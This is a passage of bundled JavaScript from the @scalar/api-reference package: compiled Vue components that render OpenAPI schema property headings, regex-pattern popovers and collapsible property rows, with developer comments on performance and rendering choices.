		* unreachable on mobile — a regression from the old inline (truncated) text.
		*/
		const rootRef = ref(null);
		const isOpen = ref(false);
		const toggle = () => {
			isOpen.value = !isOpen.value;
		};
		const close = () => {
			isOpen.value = false;
		};
		onClickOutside(rootRef, close);
		onKeyStroke("Escape", () => {
			if (isOpen.value) close();
		});
		return (_ctx, _cache) => {
			return openBlock(), createElementBlock("div", {
				ref_key: "rootRef",
				ref: rootRef,
				class: normalizeClass(["property-pattern", { "is-open": isOpen.value }])
			}, [createVNode(LinkButton_default, {
				class: "decoration-dotted",
				onClick: toggle
			}, {
				default: withCtx(() => [createTextVNode(toDisplayString(unref(translate)("schema.pattern")), 1)]),
				_: 1
			}), createBaseVNode("div", _hoisted_1$58, [createBaseVNode("button", {
				class: "property-pattern-value group",
				type: "button",
				"aria-label": `${unref(translate)("schema.copyPattern")}: ${__props.pattern}`,
				onClick: _cache[0] || (_cache[0] = ($event) => unref(copyToClipboard)(__props.pattern))
			}, [createBaseVNode("code", null, toDisplayString(__props.pattern), 1), createVNode(unref(ScalarIcon_default), {
				"aria-hidden": "true",
				class: "group-hover:text-c-1 text-c-3 ml-auto min-h-3 min-w-3",
				icon: "Clipboard",
				size: "xs"
			})], 8, _hoisted_2$37)])], 2);
		};
	}
}), [["__scopeId", "data-v-34c113d2"]]);
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/Schema/SchemaPropertyHeading.vue.script.js
var _hoisted_1$57 = { class: "property-heading [&>.property-detail:has(+.property-detail)]:mr-0" };
var _hoisted_2$36 = {
	key: 1,
	class: "property-discriminator"
};
var _hoisted_3$24 = { class: "font-code text-c-accent" };
var _hoisted_4$14 = { class: "screenreader-only" };
var _hoisted_5$11 = {
	key: 0,
	class: "property-type-signature text-c-2 text-(length:--scalar-mini)"
};
var _hoisted_6$10 = {
	key: 1,
	class: "property-type-signature text-c-2 text-(length:--scalar-mini)"
};
var _hoisted_7$7 = {
	key: 0,
	class: "screenreader-only"
};
var _hoisted_8$6 = {
	key: 3,
	class: "property-additional"
};
var _hoisted_9$5 = {
	key: 4,
	class: "property-deprecated"
};
var _hoisted_10$2 = {
	key: 5,
	class: "property-const"
};
var _hoisted_11$1 = {
	key: 7,
	class: "property-write-only"
};
var _hoisted_12$1 = {
	key: 8,
	class: "property-read-only"
};
var _hoisted_13$1 = {
	key: 9,
	class: "property-required"
};
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/Schema/SchemaPropertyHeading.vue.js
var SchemaPropertyHeading_default = /*#__PURE__*/ _plugin_vue_export_helper_default$1(/* @__PURE__ */ defineComponent({
	__name: "SchemaPropertyHeading",
	props: {
		value: {},
		enum: { type: Boolean },
		isDiscriminator: {
			type: Boolean,
			default: false
		},
		required: {
			type: Boolean,
			default: false
		},
		additional: { type: Boolean },
		withExamples: {
			type: Boolean,
			default: true
		},
		hideModelNames: {
			type: Boolean,
			default: false
		},
		modelLinkOptions: {},
		modelName: {},
		propertyNames: {},
		eventBus: { default: null },
		keyKind: {},
		recursiveTo: {}
	},
	setup(__props) {
		const props = __props;
		const { translate } = useLocalization();
		const valueRef = toRef(props, "value");
		const constValue = computed(() => {
			if (!valueRef.value) return;
			const schema = valueRef.value;
			if (schema.const !== void 0) return schema.const;
			if (schema.enum?.length === 1) return schema.enum[0];
			if (isArraySchema(schema) && schema.items) {
				const items = resolve.schema(schema.items);
				if (isDefined(items.const)) return items.const;
				if (items.enum?.length === 1) return items.enum[0];
			}
		});
		const getLeafConstraints = (schema) => {
			const properties = [];
			if (isStringSchema(schema)) {
				if (schema.minLength) properties.push({
					key: "min-length",
					prefix: `${translate("schema.minLength")}: `,
					value: schema.minLength
				});
				if (schema.maxLength) properties.push({
					key: "max-length",
					prefix: `${translate("schema.maxLength")}: `,
					value: schema.maxLength
				});
			}
			if ((isStringSchema(schema) || isNumberSchema(schema)) && schema.format) properties.push({
				key: "format",
				value: schema.format,
				truncate: true
			});
			if (isNumberSchema(schema)) {
				if (isDefined(schema.exclusiveMinimum)) properties.push({
					key: "exclusive-minimum",
					prefix: `${translate("schema.greaterThan")}: `,
					value: schema.exclusiveMinimum
				});
				if (isDefined(schema.minimum)) properties.push({
					key: "minimum",
					prefix: `${translate("schema.min")}: `,
					value: schema.minimum
				});
				if (isDefined(schema.exclusiveMaximum)) properties.push({
					key: "exclusive-maximum",
					prefix: `${translate("schema.lessThan")}: `,
					value: schema.exclusiveMaximum
				});
				if (isDefined(schema.maximum)) properties.push({
					key: "maximum",
					prefix: `${translate("schema.max")}: `,
					value: schema.maximum
				});
				if (isDefined(schema.multipleOf)) properties.push({
					key: "multiple-of",
					prefix: `${translate("schema.multipleOf")}: `,
					value: schema.multipleOf
				});
			}
			return properties;
		};
		const validationProperties = computed(() => {
			if (!valueRef.value) return [];
			const schema = valueRef.value;
			const properties = [];
			if (isArraySchema(schema)) {
				if (schema.minItems || schema.maxItems) properties.push({
					key: "array-range",
					value: `${schema.minItems || ""}…${schema.maxItems || ""}`
				});
				if (schema.uniqueItems) properties.push({
					key: "unique-items",
					value: `${translate("schema.unique")}!`
				});
			}
			properties.push(...getLeafConstraints(schema));
			if (isArraySchema(schema) && schema.items) properties.push(...getLeafConstraints(resolve.schema(schema.items)));
			return properties;
		});
		/** Link data for navigating to the referenced model in the sidebar. */
		const modelLink = computed(() => {
			if (!props.value) return null;
			if (props.hideModelNames) return null;
			if (props.modelName) return {
				schemaKey: props.modelName,
				label: props.modelName
			};
			return getModelNameWithArray(props.value);
		});
		/** Whether the model name links to the models section, or renders as plain text. */
		const modelLinkable = computed(() => isModelLinkable(modelLink.value?.schemaKey, props.modelLinkOptions ?? {}));
		/**
		* The type as a run of tokens rather than a single string — identifiers in
		* the code face, English words like `array of` in the sans face, and a muted
		* `|` so `string | null` reads as one type with an alternative.
		*
		* The token run and the screen-reader label are written straight into the
		* template instead of being their own components: the tree mounts one per
		* typed row, and a component instance costs more to create than the span it
		* renders. On a flat object the type cells would be most of the instance
		* count. The linked and the plain copy of the token markup below must stay
		* identical.
		*/
		const signatureTokens = computed(() => getDisplayTypeSignatureTokens(props.value, {
			hideModelNames: props.hideModelNames,
			modelName: modelLink.value?.label
		}));
		/** Check if we should show the type information */
		const shouldShowType = computed(() => {
			if (!props.value || !("type" in props.value)) return false;
			if (props.value.type === "array") return true;
			return !constValue.value;
		});
		/**
		* Type and format of the property keys, derived from the propertyNames schema.
		*
		* For a map keyed by UUIDs this renders e.g. "string · uuid" so the key
		* constraints are not lost. Returns undefined when there is nothing to show.
		*/
		const propertyNamesDetail = computed(() => {
			const schema = props.propertyNames;
			if (!schema) return;
			const parts = [getSchemaType(schema)];
			if ("format" in schema && typeof schema.format === "string") parts.push(schema.format);
			const detail = parts.filter(Boolean).join(" · ");
			return detail.length > 0 ? detail : void 0;
		});
		const exampleValue = computed(() => {
			if (props.value && "example" in props.value && props.value.example !== void 0) return props.value.example;
			if (props.value && isArraySchema(props.value)) {
				const itemsSchema = resolve.schema(props.value.items);
				if (itemsSchema && "example" in itemsSchema && itemsSchema.example !== void 0) return itemsSchema.example;
			}
		});
		/**
		* Whether the examples chip has anything to render.
		*
		* `SchemaPropertyExamples` already renders nothing without an example, but it
		* still mounts, and mounting is what installs its popup's window-level click
		* and keydown listeners. `withExamples` defaults to true, so without this gate
		* every property row on the page — including a plain `{ type: 'string' }` —
		* pays for a popup it never opens. Mirrors the component's own two branches.
		*/
		const hasExampleContent = computed(() => {
			if (exampleValue.value !== void 0) return true;
			const examples = props.value?.examples;
			return !!examples && typeof examples === "object" && Object.keys(examples).length > 0;
		});
		/**
		* The regex `pattern` to surface via the hover dropdown. It lives on a string
		* schema, or on the items of a primitive array (which is not rendered on its
		* own, so its constraints are surfaced on the array heading — see
		* https://github.com/scalar/scalar/issues/9690).
		*/
		const patternValue = computed(() => {
			const schema = valueRef.value;
			if (!schema) return;
			if (isStringSchema(schema) && schema.pattern) return schema.pattern;
			if (isArraySchema(schema) && schema.items) {
				const items = resolve.schema(schema.items);
				if (isStringSchema(items) && items.pattern) return items.pattern;
			}
		});
		return (_ctx, _cache) => {
			return openBlock(), createElementBlock("div", _hoisted_1$57, [
				_ctx.$slots.name ? (openBlock(), createElementBlock("div", {
					key: 0,
					class: normalizeClass(["property-name", { deprecated: props.value?.deprecated }])
				}, [renderSlot(_ctx.$slots, "name", {}, void 0, true)], 2)) : createCommentVNode("", true),
				props.isDiscriminator ? (openBlock(), createElementBlock("div", _hoisted_2$36, toDisplayString(unref(translate)("schema.discriminator")), 1)) : createCommentVNode("", true),
				props.value ? (openBlock(), createElementBlock(Fragment, { key: 2 }, [
					props.keyKind ? (openBlock(), createBlock(SchemaPropertyDetail_default, {
						key: 0,
						class: "property-key-kind"
					}, {
						default: withCtx(() => [createBaseVNode("span", _hoisted_3$24, toDisplayString(props.keyKind === "pattern" ? "patternProperty" : "additionalProperty"), 1)]),
						_: 1
					})) : createCommentVNode("", true),
					shouldShowType.value ? (openBlock(), createBlock(SchemaPropertyDetail_default, {
						key: 1,
						truncate: ""
					}, {
						default: withCtx(() => [createBaseVNode("span", _hoisted_4$14, toDisplayString(unref(translate)("schema.type")) + ": ", 1), props.eventBus && modelLink.value?.schemaKey && modelLinkable.value ? (openBlock(), createElementBlock("button", {
							key: 0,
							class: "text-c-3 hover:text-c-1 underline",
							type: "button",
							onClick: _cache[0] || (_cache[0] = ($event) => props.eventBus.emit("scroll-to:model-by-name", { name: modelLink.value.schemaKey }))
						}, [signatureTokens.value.length ? (openBlock(), createElementBlock("span", _hoisted_5$11, [(openBlock(true), createElementBlock(Fragment, null, renderList(signatureTokens.value, (token, index) => {
							return openBlock(), createElementBlock(Fragment, { key: index }, [createTextVNode(toDisplayString(index > 0 ? " " : ""), 1), createBaseVNode("span", { class: normalizeClass(["property-type-token", [
								`property-type-token--${token.kind}`,
								token.kind === "word" ? "font-sans" : "",
								token.kind === "ident" || token.kind === "literal" ? "font-code" : "",
								token.kind === "punctuation" ? "text-c-3" : ""
							]]) }, toDisplayString(token.text), 3)], 64);
						}), 128))])) : createCommentVNode("", true)])) : signatureTokens.value.length ? (openBlock(), createElementBlock("span", _hoisted_6$10, [(openBlock(true), createElementBlock(Fragment, null, renderList(signatureTokens.value, (token, index) => {
							return openBlock(), createElementBlock(Fragment, { key: index }, [createTextVNode(toDisplayString(index > 0 ? " " : ""), 1), createBaseVNode("span", { class: normalizeClass(["property-type-token", [
								`property-type-token--${token.kind}`,
								token.kind === "word" ? "font-sans" : "",
								token.kind === "ident" || token.kind === "literal" ? "font-code" : "",
								token.kind === "punctuation" ? "text-c-3" : ""
							]]) }, toDisplayString(token.text), 3)], 64);
						}), 128))])) : createCommentVNode("", true)]),
						_: 1
					})) : createCommentVNode("", true),
					props.recursiveTo ? (openBlock(), createBlock(SchemaPropertyDetail_default, {
						key: 2,
						class: "property-recursive",
						title: unref(translate)("schema.recursiveReference", { name: props.recursiveTo })
					}, {
						default: withCtx(() => [createTextVNode(toDisplayString(unref(translate)("schema.recursive")), 1)]),
						_: 1
					}, 8, ["title"])) : createCommentVNode("", true),
					propertyNamesDetail.value ? (openBlock(), createBlock(SchemaPropertyDetail_default, {
						key: 3,
						truncate: ""
					}, {
						prefix: withCtx(() => [createTextVNode(toDisplayString(unref(translate)("schema.keys")) + ":", 1)]),
						default: withCtx(() => [createTextVNode(" " + toDisplayString(propertyNamesDetail.value), 1)]),
						_: 1
					})) : createCommentVNode("", true),
					(openBlock(true), createElementBlock(Fragment, null, renderList(validationProperties.value, (property) => {
						return openBlock(), createBlock(SchemaPropertyDetail_default, {
							key: property.key,
							code: property.code,
							truncate: property.truncate
						}, createSlots({
							default: withCtx(() => [property.key === "format" ? (openBlock(), createElementBlock("span", _hoisted_7$7, toDisplayString(unref(translate)("schema.format")) + ": ", 1)) : createCommentVNode("", true), createTextVNode(" " + toDisplayString(property.value), 1)]),
							_: 2
						}, [property.prefix ? {
							name: "prefix",
							fn: withCtx(() => [createTextVNode(toDisplayString(property.prefix), 1)]),
							key: "0"
						} : void 0]), 1032, ["code", "truncate"]);
					}), 128)),
					props.enum ? (openBlock(), createBlock(SchemaPropertyDetail_default, { key: 4 }, {
						default: withCtx(() => [createTextVNode(toDisplayString(unref(translate)("schema.enum")), 1)]),
						_: 1
					})) : createCommentVNode("", true)
				], 64)) : createCommentVNode("", true),
				props.additional ? (openBlock(), createElementBlock("div", _hoisted_8$6, [props.value?.["x-additionalPropertiesName"] ? (openBlock(), createElementBlock(Fragment, { key: 0 }, [createTextVNode(toDisplayString(props.value["x-additionalPropertiesName"]), 1)], 64)) : (openBlock(), createElementBlock(Fragment, { key: 1 }, [createTextVNode(toDisplayString(unref(translate)("schema.additionalProperties")), 1)], 64))])) : createCommentVNode("", true),
				props.value?.deprecated ? (openBlock(), createElementBlock("div", _hoisted_9$5, [createVNode(unref(Badge_default), null, {
					default: withCtx(() => [createTextVNode(toDisplayString(unref(translate)("schema.deprecated")), 1)]),
					_: 1
				})])) : createCommentVNode("", true),
				constValue.value !== void 0 ? (openBlock(), createElementBlock("div", _hoisted_10$2, [createVNode(SchemaPropertyDetail_default, { truncate: "" }, {
					prefix: withCtx(() => [createTextVNode(toDisplayString(unref(translate)("schema.const")) + ": ", 1)]),
					default: withCtx(() => [createVNode(RenderString_default, { value: constValue.value }, null, 8, ["value"])]),
					_: 1
				})])) : (openBlock(), createElementBlock(Fragment, { key: 6 }, [props.value?.nullable === true ? (openBlock(), createBlock(SchemaPropertyDetail_default, { key: 0 }, {
					default: withCtx(() => [createTextVNode(toDisplayString(unref(translate)("schema.nullable")), 1)]),
					_: 1
				})) : createCommentVNode("", true)], 64)),
				props.value?.writeOnly ? (openBlock(), createElementBlock("div", _hoisted_11$1, toDisplayString(unref(translate)("schema.writeOnly")), 1)) : props.value?.readOnly ? (openBlock(), createElementBlock("div", _hoisted_12$1, toDisplayString(unref(translate)("schema.readOnly")), 1)) : createCommentVNode("", true),
				props.required ? (openBlock(), createElementBlock("div", _hoisted_13$1, toDisplayString(unref(translate)("schema.required")), 1)) : createCommentVNode("", true),
				props.value?.default !== void 0 ? (openBlock(), createBlock(SchemaPropertyDefault_default, {
					key: 10,
					value: props.value?.default
				}, null, 8, ["value"])) : createCommentVNode("", true),
				patternValue.value ? (openBlock(), createBlock(SchemaPropertyPattern_default, {
					key: 11,
					pattern: patternValue.value
				}, null, 8, ["pattern"])) : createCommentVNode("", true),
				props.withExamples && hasExampleContent.value ? (openBlock(), createBlock(SchemaPropertyExamples_default, {
					key: 12,
					example: exampleValue.value,
					examples: props.value?.examples
				}, null, 8, ["example", "examples"])) : createCommentVNode("", true),
				renderSlot(_ctx.$slots, "preview", {}, void 0, true),
				renderSlot(_ctx.$slots, "trailing", {}, void 0, true)
			]);
		};
	}
}), [["__scopeId", "data-v-b0dec6a3"]]);
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/Schema/SchemaProperty.vue.script.js
var _hoisted_1$56 = ["id"];
var _hoisted_2$35 = {
	key: 0,
	class: "property-name-pattern-properties text-c-1! border-0! p-0! before:hidden!"
};
var _hoisted_3$23 = {
	key: 1,
	class: "property-name-additional-properties text-c-1! border-0! p-0! before:hidden!"
};
var _hoisted_4$13 = ["id"];
var _hoisted_5$10 = {
	key: 0,
	class: "property-name-pattern-properties text-c-1! border-0! p-0! before:hidden!"
};
var _hoisted_6$9 = {
	key: 1,
	class: "property-name-additional-properties text-c-1! border-0! p-0! before:hidden!"
};
var _hoisted_7$6 = {
	key: 2,
	class: "property-description mt-1! has-[+.property-rule]:mb-1.5!"
};
var _hoisted_8$5 = ["id"];
var _hoisted_9$4 = {
	key: 7,
	class: "children [.property-description+&]:mt-1.5!"
};
/**
* Note: We're taking in a prop called `value` which should be a JSON Schema.
*
* We're using `optimizeValueForDisplay` to merge null types in compositions (anyOf, allOf, oneOf, not).
* So you should basically use the optimizedValue everywhere in the component.
*/
/** Composition keywords that hold a list of schemas and can be flattened when they contain a single member. */
/**
* The `v-on` binding a row without a disclosure gets. Module scope, and frozen
* so it cannot be written through: an inline `{}` in the template is a fresh
* object on every render of every row, and this component renders once per
* property on the page.
*/
var NO_LISTENERS = Object.freeze({});
//#endregion
//#region node_modules/@scalar/api-reference/dist/components/Content/Schema/SchemaProperty.vue.js
var SchemaProperty_default = /*#__PURE__*/ _plugin_vue_export_helper_default$1(/* @__PURE__ */ defineComponent({
	__name: "SchemaProperty",
	props: {
		is: {},
		schema: {},
		noncollapsible: { type: Boolean },
		level: { default: 0 },
		depth: { default: 0 },
		name: {},
		required: {
			type: Boolean,
			default: false
		},
		compact: {
			type: Boolean,
			default: false
		},
		discriminator: {},
		description: {},
		hideModelNames: {
			type: Boolean,
			default: false
		},
		hideHeading: { type: Boolean },
		modelName: {},
		variant: {},
		breadcrumb: {},
		eventBus: {},
		options: {},
		propertyNamesEnum: {},
		propertyNamesSchema: {},
		schemaContext: {},
		compositionPath: {},
		compositionPathSegment: {},
		cycleKey: {}
	},
	setup(__props) {
		const SINGLE_ITEM_COMPOSITIONS = [
			"oneOf",
			"anyOf",
			"allOf"
		];
		const props = __props;
		/** The dynamic scope inherited from the enclosing schema resources, used to bind `$dynamicRef`s. */
		const dynamicScope = useDynamicScope();
		/**
		* Simplified composition with `null` type.
		*
		* A top-level `$dynamicRef` (e.g. a linked-list `next` node) is bound to its concrete type via the
		* dynamic scope first; for ordinary schemas this is a no-op.
		*
		* The value is unwrapped here as well as at the `Schema` root, because callers such as
		* `ParameterListItem` and `Headers` hand a schema in below a root and would otherwise leave the
		* whole subtree on the reactive and detect-changes proxies. See {@link unwrapForRead}.
		*/
		const optimizedValue = computed(() => normalizeObjectComposition(optimizeValueForDisplay(resolveDynamicSchema(unwrapForRead(props.schema), dynamicScope)), props.name));
		const childBreadcrumb = computed(() => props.breadcrumb ? props.name ? [...props.breadcrumb, props.name] : props.breadcrumb : void 0);
		const currentCompositionPath = computed(() => props.compositionPathSegment ? [...props.compositionPath ?? [], props.compositionPathSegment] : props.compositionPath ?? []);
		const arrayItemsCompositionPath = computed(() => [...currentCompositionPath.value, "items"]);
		const shouldHaveLink = computed(() => props.level <= 2);
		/**
		* Whether the name gets a deep link (an anchor id and a trailing copy button).
		*
		* Mirrors the condition `WithBreadcrumb` renders its anchor under. Without a link that
		* component only passes its slot through, yet every named row still paid to mount it
		* (a localization inject and an unread label computed), and most rows have no link: any
		* row deeper than level 2, and every row on surfaces that pass no breadcrumb at all
		* (models, the classic layout, AsyncAPI). So the template mounts `WithBreadcrumb` only
		* for linked rows and renders the same name span directly for the rest. Both branches
		* carry an identical copy of the span, comments included: the template comments are
		* DOM nodes in development builds, so the two copies must stay byte-for-byte in step.
		*/
		const hasBreadcrumbLink = computed(() => shouldHaveLink.value && (childBreadcrumb.value?.length ?? 0) > 0);
		/**
		* The array schema used for item inspection, with a `$dynamicRef` item bound to its concrete type.
		*
		* Returns the schema unchanged unless `items` is a `$dynamicRef` that resolves against the dynamic
		* scope, so ordinary arrays (including `$ref` items) keep their existing behavior exactly.
		*/
		const arrayValueWithBoundItems = computed(() => {
			const value = optimizedValue.value;
			if (!value || !isArraySchema(value) || !isDynamicRef(value.items)) return value;
			const bound = resolveDynamicRef(value.items.$dynamicRef, dynamicScope);
			return bound ? {
				...value,
				items: bound
			} : value;
		});
		/** Checks if array items have complex structure */
		const hasComplexArrayItemsComputed = computed(() => hasComplexArrayItems(arrayValueWithBoundItems.value));
		/** Check if enum should be displayed (from value schema or from propertyNames) */
		const hasEnum = computed(() => enumValues.value.length > 0);
		/**
		* The `oneOf` inferred from a bare `discriminator.mapping`, or `null` when there
		* is nothing to infer. Computed once and shared: `shouldRenderObjectProperties`
		* uses it to suppress the duplicate base object block, and `compositionsToRender`
		* passes it on so the inference does not run twice per render.
		*/
		const inferredDiscriminatorComposition = computed(() => optimizedValue.value ? inferDiscriminatorMappingComposition(optimizedValue.value, props.options.document) : null);
		/** Determine if object properties should be displayed */
		const shouldRenderObjectProperties = computed(() => {
			const value = optimizedValue.value;
			if (!value) return false;
			if (!("properties" in value || "additionalProperties" in value)) return false;
			if ("allOf" in value) return false;
			if (!(!!props.schema && typeof props.schema === "object" && "allOf" in props.schema) && inferredDiscriminatorComposition.value) return false;
			const type = "type" in value ? value.type : void 0;
			const isExplicitNonObject = typeof type === "string" && type !== "object";
			return isTypeObject(value) || !isExplicitNonObject;
		});
		/** Determine if array of objects should be rendered */
		const shouldRenderArrayOfObjects = computed(() => {
			const value = optimizedValue.value;
			if (!value || !isArraySchema(value) || typeof value.items !== "object") return false;
			return hasComplexArrayItemsComputed.value;
		});
		/** Extract enum values from schema or array items */
		const enumValues = computed(() => getEnumValues(optimizedValue.value));
		/** Generate property description from type/format */
		const propertyDescription = computed(() => getPropertyDescription(optimizedValue.value));
		/** Determine if description should be displayed */
		const displayDescription = computed(() => shouldDisplayDescription(optimizedValue.value, props.description));
		/**
		* The schema used to render the object's own properties.
		*
		* Composition keywords are stripped so the nested object renders only its
		* properties. The compositions are rendered separately below; leaving them here
		* would route the nested `Schema` back through `SchemaProperty` and recurse.
		*
		* The `discriminator` is stripped too: its variant selector is part of the
		* composition rendered below (including the one inferred from a bare
		* `discriminator.mapping`), so keeping it here would make the nested `Schema`
		* infer and render a second, identical selector.
		*
		* When the property already renders the description, we also drop it to avoid
		* repeating it in the nested object schema card.
		*/
		const objectSchemaForChildren = computed(() => {
			const value = optimizedValue.value;
			if (!value) return value;
			const { oneOf: _oneOf, anyOf: _anyOf, allOf: _allOf, not: _not, discriminator: _discriminator, ...objectSchema } = value;
			if (displayDescription.value && "description" in objectSchema) {
				const { description: _description, ...schemaWithoutDescription } = objectSchema;
				return schemaWithoutDescription;
			}
			return objectSchema;
		});
		/** Determine if property heading should be displayed */
		const shouldDisplayHeadingComputed = computed(() => shouldDisplayHeading(optimizedValue.value, props.name, props.required));
		/** Computes which compositions should be rendered and with which values */
		const compositionsToRender = computed(() => getCompositionsToRender(optimizedValue.value, props.options.document, inferredDiscriminatorComposition.value));
		/**
		* Whether the schema carries any `x-` key at all.
		*
		* `SpecificationExtension` renders nothing for a schema without extensions, but mounting
		* it still costs a plugin-manager inject, two computeds and a key scan per row, and almost
		* no row has an extension. This cheap scan gates the mount instead: it is a superset of the
		* component's own condition, so a row with an `x-` key still mounts it and any extension a
		* plugin registers still renders. `optimizedValue` is a plain shallow copy, so the loop
		* reads no reactive proxy.
		*/
		const hasSpecificationExtensions = computed(() => {
			const value = optimizedValue.value;
			if (!value || typeof value !== "object") return false;
			for (const key in value) if (key.startsWith("x-")) return true;
			return false;
		});
		const getCompositionDiscriminator = (composition) => composition === "allOf" ? props.schema?.discriminator ?? props.discriminator : props.schema?.discriminator;
		/**
		* Get resolved array items for rendering (with any `$dynamicRef` bound to the concrete type).
		*
		* When the items are wrapped in a single-item composition (e.g. `items: { allOf: [{ type: 'object', ... }] }`), we
		* flatten that wrapper into its plain form. A composition with a single member is equivalent to that member, so
		* keeping the composition keyword only makes the items render through an extra schema layer, which adds an
		* unnecessary level of nesting and duplicates the item description. See https://github.com/scalar/scalar/issues/5900
		*/
		const resolvedArrayItems = computed(() => {
			const value = arrayValueWithBoundItems.value;
			if (!value || !isArraySchema(value) || typeof value.items !== "object") return;
			const items = resolve.schema(value.items);
			return SINGLE_ITEM_COMPOSITIONS.some((keyword) => Array.isArray(items?.[keyword]) && items[keyword]?.length === 1) ? optimizeValueForDisplay(items) : items;
		});
		/**
		* Cycle key for the array items schema, derived from the raw (unresolved) items
		* so a self-referential array element is detected as a cycle.
		*/
		const arrayItemsCycleKey = computed(() => {
			const value = optimizedValue.value;
			if (!value || !isArraySchema(value)) return;
			return getCycleKey(value.items);
		});
		/**
		* Props for a child `<Schema>`, derived once instead of at every call site.
		*
		* A row's children render in two places — an open panel and a nameless
		* container — and each used to spell out both branches in full: four
		* invocations of thirteen near-identical props. All but one belong to the row
		* rather than the site, so they live here; the sites still pass `depth` (the
		* panel steps it, the container does not).
		*/
		const sharedChildProps = computed(() => ({
			compact: props.compact,
			eventBus: props.eventBus,
			hideModelNames: props.hideModelNames,
			level: props.level + 1,
			name: props.name,
			options: props.options,
			schemaContext: props.schemaContext
		}));
		/** The object branch: this row's own properties, under this row's anchor path. */
		const objectChildProps = computed(() => shouldRenderObjectProperties.value ? {
			...sharedChildProps.value,
			breadcrumb: childBreadcrumb.value,
			compositionPath: currentCompositionPath.value,
			cycleKey: props.cycleKey,
			schema: objectSchemaForChildren.value
		} : null);
		/**
		* The array branch: the items schema. Deliberately no breadcrumb — items are
		* not a named property, so they extend no anchor path.
		*/
		const arrayChildProps = computed(() => shouldRenderArrayOfObjects.value && resolvedArrayItems.value ? {
			...sharedChildProps.value,
			compositionPath: arrayItemsCompositionPath.value,
			cycleKey: arrayItemsCycleKey.value,
			schema: resolve.schema(resolvedArrayItems.value)
		} : null);
		/**
		* What a site renders: the branches tried object-first. They are derived
		* separately above because a schema can satisfy both, and the row has to know
		* which one it draws — see `rendersArrayBranch`.
		*/
		const treeChildProps = computed(() => objectChildProps.value ?? arrayChildProps.value);
		/**
		* Whether a row draws its ARRAY branch, which is the object branch's
		* first-match complement rather than `shouldRenderArrayOfObjects` on its own.
		* The two branches are not exclusive: `isArraySchema` accepts a type LIST, so
		* a schema typed `['array', 'object']` carrying both `items` and `properties`
		* satisfies both, and `treeChildProps` renders the object one. Everything a
		* row says about its children — the cycle key, the count, the preview — has to
		* describe the branch the panel actually draws.
		*/
		const rendersArrayBranch = computed(() => !objectChildProps.value && !!arrayChildProps.value);
		/** Check if discriminator matches current property */
		const isDiscriminatorProperty = computed(() => Boolean(props.name && props.discriminator?.propertyName === props.name));
		const { translate } = useLocalization();
		/** Whether this property has children to put behind a toggle. */
		const isExpandable = computed(() => shouldRenderObjectProperties.value || shouldRenderArrayOfObjects.value);
		/**
		* Whether this property loops back onto an ancestor schema. A cycle renders
		* as a leaf row whose signature line says `recursive`.
		*/
		const ancestors = inject(SCHEMA_ANCESTORS_SYMBOL, void 0);
		const treeCycleKey = computed(() => rendersArrayBranch.value ? arrayItemsCycleKey.value : props.cycleKey);
		const isCyclicProperty = computed(() => treeCycleKey.value != null && !!ancestors?.has(treeCycleKey.value));
		/**
		* The schema the cycle returns to, which is what the row names. The cycle key
		* for a `$ref` node is the ref string, so the model name falls out of it;
		* naming this row instead would describe the wrong end of the loop.
		*/
		const cycleTargetName = computed(() => {
			const key = treeCycleKey.value;
			if (typeof key === "string") {
				const refName = getRefName(key);
				if (refName) return refName;
			}
			return props.modelName || props.name || translate("schema.schema");
		});
		const expansion = useSchemaExpansion();
		/** See Schema.vue — surfaces without breadcrumbs keep per-instance state. */
		const anonymousTreeKey = useId();
		/**
		* This row's identity in the expansion store: deliberately the plain anchor
		* path, identical to the string the row's own anchor uses, so `commitPath`
		* can open it for a deep link. A structural marker would not be a prefix of
		* any anchor, and bridging that gap (an alias registry, an anchorPath hint)
		* expanded unrelated siblings and clobbered the reader's explicit collapse.
		*/
		const treeNodeKey = computed(() => toNodeKey(childBreadcrumb.value) || `~anonymous-${anonymousTreeKey}`);
		/**
		* Whether this property renders as a collapsible tree row. A nameless container
		* has no heading to hang a control on, so it renders its children directly.
		*/
		const isTreeRow = computed(() => isExpandable.value && !props.noncollapsible && shouldDisplayHeadingComputed.value && !isCyclicProperty.value);
		const isTreeOpen = computed(() => isTreeRow.value && expansion.isExpanded(treeNodeKey.value, {
			cyclic: isCyclicProperty.value,
			defaultOpen: !!props.options.expandAllSchemaProperties
		}));
		/**
		* Mount policy, three states. Never opened: not rendered, which is the render
		* guard that stops a `$ref` cycle from recursing. Open: rendered. Opened then
		* closed: kept under `hidden="until-found"` so find-in-page can reach it,
		* against a budget the whole reference shares, so hundreds of closed rows across
		* every tree on the page do not pile up as hidden DOM.
		* Past the cap, and in Safari where `until-found` is inert, closed panels unmount.
		*/
		const keepClosedPanelMounted = ref(false);
		watch(isTreeOpen, (open, wasOpen) => {
			if (open) {
				if (keepClosedPanelMounted.value) {
					expansion.untilFound.release();
					keepClosedPanelMounted.value = false;
				}
				return;
			}
			if (wasOpen) keepClosedPanelMounted.value = supportsUntilFound() && expansion.untilFound.acquire();
		});
		onScopeDispose(() => {
			if (keepClosedPanelMounted.value) {
				expansion.untilFound.release();
				keepClosedPanelMounted.value = false;
			}
		});
		/** `hidden="until-found"` support — Safari is the lone engine without it. */
		const supportsUntilFound = () => typeof document !== "undefined" && "onbeforematch" in document.body;
		const isTreePanelRendered = computed(() => isTreeOpen.value || keepClosedPanelMounted.value);
		const treePanelId = useId();
		const treeNameId = useId();
		const treeCountId = useId();
		/** The rail panel is a component, so the DOM node is reached through `$el`. */
		const treePanelRef = useTemplateRef("treePanel");
		const treeToggleRef = useTemplateRef("treeToggle");
		/**
		* Hovering the heading lights this row's puck, because the heading toggles the
		* row on click too. The state is a `data-heading-hovered` attribute on the row,
		* written by pointer events, rather than the former
		* `.property--tree:has(> .property-heading:hover)` selector: a `:has()` anchor
		* on every expandable row made each element inserted under it restyle the
		* whole open subtree. The attribute exists only while hovering and says exactly
		* what `:hover` said (see tailwind.config.css). Bound on tree rows only, so
		* leaf rows carry no listener and their DOM is untouched.
		*/
		let headingHoveredRow = null;
		const clearHeadingHover = () => {
			headingHoveredRow?.removeAttribute("data-heading-hovered");
			headingHoveredRow = null;
		};
		const treeHeadingHoverListeners = {
			pointerenter: (event) => {
				clearHeadingHover();
				const row = event.currentTarget instanceof HTMLElement ? event.currentTarget.parentElement : null;
				if (!row) return;
				row.setAttribute("data-heading-hovered", "");
				headingHoveredRow = row;
			},
			pointerleave: clearHeadingHover
		};
		watch(isTreeRow, (treeRow) => {
			if (!treeRow) clearHeadingHover();
		});
